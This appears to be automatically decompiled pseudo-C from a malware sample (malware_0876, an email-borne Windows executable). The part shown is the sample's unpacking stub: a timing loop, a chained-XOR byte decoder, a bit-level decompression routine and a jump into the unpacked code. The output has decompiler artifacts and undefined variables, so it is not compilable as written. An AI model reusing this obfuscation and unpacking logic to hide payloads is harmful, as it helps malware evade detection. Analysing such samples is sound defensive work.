// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0876/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn004160C6(word32 eax)
{
	word32 ecx_11 = 0xFFFE7960;
	do
	{
		eax = eax_36;
		ecx_11 = ecx_11 - 0x00000001;
		word32 eax_36 = eax;
	} while (ecx_11 != 0x00000000);
	fn004160FA(dwLoc24);
	fn004160FA(eax_36);
	return;
}

void fn004160FA(word32 dwArg00)
{
	word32 esp_23 = fp + 0x00000004 + 0x00000004;
	word32 ebx_14 = Mem0[dwArg00 - 0x000000A6:word32];
	word32 esi_15 = ebx_14 + 0x00012DE6;
	word32 eax_28 = Mem0[esi_15 + 0x00000000:word32];
	word16 ax_29 = (word16) eax_28;
	word32 esi_30 = esi_15 + 0x00000004;
	while (eax_28 != 0x00000000)
	{
		word32 esp_34 = esp_23 - 0x00000004;
		Mem35[esp_34 + 0x00000000:word32] = eax_28;
		word32 eax_37 = DPB(eax_28, ax_29, 0, 16);
		word32 edi_46 = ebx_14 + Mem35[esi_30 + 0x00000000:word32];
		Mem48[esp_34 - 0x00000004:word32] = esi_30 + 0x00000004;
		Mem50[esp_34 - 0x00000008:word32] = edi_46;
		fn00416290(eax_37, esi_30 + 0x00000004, esi_30 + 0x00000004);
		word32 esi_55 = Mem50[esp_34 - 0x00000004:word32];
		fn00416186(dwArg00 - 0x000000BE, esi_55, Mem50[esp_34 - 0x00000008:word32]);
		word32 eax_57 = Mem50[esp_34 + 0x00000000:word32];
		esp_23 = esp_34 + 0x00000004;
		esi_15 = esi_55 + DPB(eax_57, (word16) eax_57, 0, 16);
		eax_28 = Mem0[esi_15 + 0x00000000:word32];
		ax_29 = (word16) eax_28;
		esi_30 = esi_15 + 0x00000004;
	}
	(ebx_14 + 0x0000CDE8)();
	Mem86[esp_23 + 0x00000000 + 0x00000018:word32] = 0x00401272;
	return;
}

void fn00416186(word32 ebp, word32 esi, word32 edi)
{
// def fp
// def ebp
// def esi
// def edi
// def Mem0
	esp_22 = fp - 0x00000020;
	dl_25 = 0x80;
	ebx_27 = 0x00000000;
l0041618B:
// ebp_36 = PHI(ebp, ebp_58)
// ebx_38 = PHI(ebx_27, ebx_61)
// dl_39 = PHI(dl_25, dl_74)
// esp_47 = PHI(esp_22, esp_69)
// esi_48 = PHI(esi, esi_73)
// edi_50 = PHI(edi, edi_72)
	v13_52 = Mem0[esi_48 + 0x00000000:byte];
	Mem53[edi_50 + 0x00000000:byte] = v13_52;
	esi_54 = esi_48 + 0x00000001;
	edi_55 = edi_50 + 0x00000001;
	bl_56 = 0x02;
	ebx_57 = DPB(ebx_38, 0x02, 0, 8);
// ebp_58 = PHI(ebp_36, ebp_58, ebp_82)
// ebx_61 = PHI(ebx_57, ebx_177, ebx_85)
// dl_62 = PHI(dl_39, dl_187, dl_86)
// esp_69 = PHI(esp_47, esp_69, esp_110)
// esi_70 = PHI(esi_54, esi_186, esi_109)
// edi_72 = PHI(edi_55, edi_197, edi_103)
	C_75 = fn00416200(esi_70, dl_62, out esi_73, out dl_74);
	while (!C_75)
	{
		ecx_76 = 0x00000000;
		C_81 = fn00416200(esi_73, dl_74, out esi_79, out dl_80);
		if (C_81)
		{
			ecx_231 = fn0041620C(0x00000000, esi_79, dl_80, out esi_229, out dl_230);
			ecx_232 = ecx_231 - ebx_61;
			if (ecx_232 == 0x00000000)
			{
				ecx_237 = fn0041620A(esi_229, dl_230, out esi_235, out dl_236);
				esp_238 = esp_69 + 0xFFFFFFFC;
			}
			else
			{
				eax_240 = ecx_232;
				eax_242 = ecx_232 - 0x00000001;
				eax_243 = ecx_232 - 0x00000001 << 0x00000008;
				ah_244 = ecx_232 - 0x00000001;
				al_246 = Mem53[esi_229 + 0x00000000:byte];
				eax_247 = DPB(eax_243, al_246, 0, 8);
				esi_248 = esi_229 + 0x00000001;
				ecx_251 = fn0041620A(esi_229 + 0x00000001, dl_230, out esi_249, out dl_250);
				esp_252 = esp_69 + 0xFFFFFFFC;
				if (eax_247 >=u 0x00007D00)
					goto l004161EF;
				else if (ah_244 <u 0x05)
					if (eax_247 <=u 0x0000007F)
					{
l004161EF:
// dl_155 = PHI(dl_174, dl_250, dl_250)
// eax_157 = PHI(eax_201, eax_247, eax_247)
// esp_162 = PHI(esp_69, esp_252, esp_252)
// esi_163 = PHI(esi_200, esi_249, esi_249)
// ecx_164 = PHI(ecx_209, ecx_251, ecx_251)
						ecx_165 = ecx_164 + 0x00000001;
						ecx_166 = ecx_165 + 0x00000001;
l004161F0:
// dl_142 = PHI(dl_155, dl_250)
// eax_144 = PHI(eax_157, eax_247)
// esp_149 = PHI(esp_162, esp_252)
// esi_150 = PHI(esi_163, esi_249)
// ecx_151 = PHI(ecx_166, ecx_251)
						ecx_152 = ecx_151 + 0x00000001;
					}
				else
					goto l004161F0;
// dl_127 = PHI(dl_142, dl_250)
// eax_129 = PHI(eax_144, eax_247)
// esp_135 = PHI(esp_149, esp_252)
// esi_136 = PHI(esi_150, esi_249)
// ecx_137 = PHI(ecx_152, ecx_251)
				v19_138 = eax_129;
				ebp_140 = v19_138;
			}
// ebp_111 = PHI(ebp_58, ebp_140)
// dl_112 = PHI(dl_236, dl_127)
// esp_118 = PHI(esp_238, esp_135)
// esi_119 = PHI(esi_235, esi_136)
// ecx_120 = PHI(ecx_237, ecx_137)
			eax_121 = ebp_111;
			bl_124 = 0x01;
			ebx_125 = DPB(ebx_61, 0x01, 0, 8);
			goto l004161F6;
		}
		eax_168 = 0x00000000;
		C_175 = fn00416200(esi_79, dl_80, out esi_173, out dl_174);
		if (C_175)
		{
			al_198 = Mem53[esi_173 + 0x00000000:byte];
			eax_199 = (word32) al_198;
			esi_200 = esi_173 + 0x00000001;
			eax_201 = eax_199 >>u 0x00000001;
			if (eax_199 >>u 0x00000001 != 0x00000000)
			{
				ecx_209 = eax_199 >>u 0x00000001 <u 0x00000000;
				goto l004161EF;
			}
			edi_211 = edi_72 - Mem53[esp_69 + 0x00000028:word32];
			Mem213[esp_69 + 0x0000001C:word32] = edi_211;
			return;
		}
		bl_176 = 0x02;
		ebx_177 = DPB(ebx_61, 0x02, 0, 8);
		ecx_178 = 0x00000001;
		al_180 = 0x10;
		eax_181 = 0x00000010;
		do
		{
// dl_182 = PHI(dl_174, dl_187)
// al_183 = PHI(al_180, al_189)
// eax_184 = PHI(eax_181, eax_190)
// esi_185 = PHI(esi_173, esi_186)
			C_188 = fn00416200(esi_185, dl_182, out esi_186, out dl_187);
			al_189 = al_183 * 0x02 + C_188;
			eax_190 = DPB(eax_184, al_189, 0, 8);
		} while (al_189 >=u 0x00);
		if (al_189 == 0x00)
		{
			Mem196[edi_72 + 0x00000000:byte] = al_189;
			edi_197 = edi_72 + 0x00000001;
		}
		else
		{
l004161F6:
// ebp_82 = PHI(ebp_58, ebp_111)
// ebx_85 = PHI(ebx_177, ebx_125)
// dl_86 = PHI(dl_187, dl_112)
// eax_88 = PHI(eax_190, eax_121)
// esp_93 = PHI(esp_69, esp_118)
// esi_94 = PHI(esi_186, esi_119)
// ecx_95 = PHI(ecx_178, ecx_120)
			esp_96 = esp_93 - 0x00000004;
			Mem97[esp_96 + 0x00000000:word32] = esi_94;
			esi_98 = edi_72;
			esi_99 = edi_72 - eax_88;
// esi_101 = PHI(esi_99, esi_106)
// ecx_102 = PHI(ecx_95, ecx_108)
// edi_103 = PHI(edi_72, edi_107)
			while (ecx_102 != 0x00000000)
			{
				v18_104 = Mem97[esi_101 + 0x00000000:byte];
				Mem105[edi_103 + 0x00000000:byte] = v18_104;
				esi_106 = esi_101 + 0x00000001;
				edi_107 = edi_103 + 0x00000001;
				ecx_108 = ecx_102 - 0x00000001;
// esi_101 = PHI(esi_99, esi_106)
// ecx_102 = PHI(ecx_95, ecx_108)
// edi_103 = PHI(edi_72, edi_107)
			}
			esi_109 = Mem97[esp_96 + 0x00000000:word32];
			esp_110 = esp_96 + 0x00000004;
		}
// ebp_58 = PHI(ebp_36, ebp_58, ebp_82)
// ebx_61 = PHI(ebx_57, ebx_177, ebx_85)
// dl_62 = PHI(dl_39, dl_187, dl_86)
// esp_69 = PHI(esp_47, esp_69, esp_110)
// esi_70 = PHI(esi_54, esi_186, esi_109)
// edi_72 = PHI(edi_55, edi_197, edi_103)
		C_75 = fn00416200(esi_70, dl_62, out esi_73, out dl_74);
	}
}

byte fn00416200(word32 esi, byte dl, ptr32 esiOut, ptr32 dlOut)
{
	*esiOut = esi;
	byte dl_3;
	*dlOut = dl * 0x02;
	byte C_14 = cond(dl * 0x02);
	if (dl * 0x02 == 0x00)
	{
		byte dl_20 = Mem0[esi + 0x00000000:byte] * 0x02 + (dl * 0x02 <u 0x00);
		*dlOut = dl_20;
		word32 esi_19;
		*esiOut = esi + 0x00000001;
		C_14 = cond(dl_20);
	}
	return C_14;
}

word32 fn0041620A(word32 esi, byte dl, ptr32 esiOut, ptr32 dlOut)
{
	word32 esi_7;
	byte dl_8;
	return fn0041620C(0x00000000, esi, dl, out esi_7, out dl_8);
}

word32 fn0041620C(word32 ecx, word32 esi, byte dl, ptr32 esiOut, ptr32 dlOut)
{
	word32 ecx_13 = ecx + 0x00000001;
	do
	{
		word32 esi_10;
		byte dl_11;
		ecx_13 = ecx_13 * 0x00000002 + fn00416200(esi, dl, out esi_10, out dl_11);
	} while (fn00416200(esi_10, dl_11, out esi, out dl));
	return ecx_13;
}

void fn00416290(word32 ecx, word32 esi, word32 edi)
{
	do
	{
		word32 eax_22 = DPB(eax, Mem0[esi + 0x00000000:byte], 0, 8);
		word32 esi_23 = esi + 0x00000001;
		byte al_26 = (byte) eax_22;
		byte al_34 = (byte) DPB(eax, al_26 ^ 0x6C ^ 0xA8 ^ 0x4B, 0, 8);
		byte al_42 = (byte) DPB(eax, al_34 ^ 0xE0, 0, 8) ^ 0x06 ^ 0x11;
		esi = esi_23;
		byte al_58 = (byte) DPB(eax, al_42 ^ 0x23 ^ 0xD7, 0, 8);
		byte al_69 = al_58 ^ 0xA0 ^ 0x9A ^ 0x07 ^ 0xBE ^ 0x2E ^ 0x5D;
		byte al_76 = al_69 ^ 0x7D ^ 0x5F;
		byte al_84 = al_76 ^ 0x42 ^ 0xDE;
		eax = DPB(eax, al_84, 0, 8);
		Mem92[edi + 0x00000000:byte] = al_84 ^ 0xAF;
		edi = edi + 0x00000001;
		ecx = ecx - 0x00000001;
	} while (ecx != 0x00000000);
	return;
}

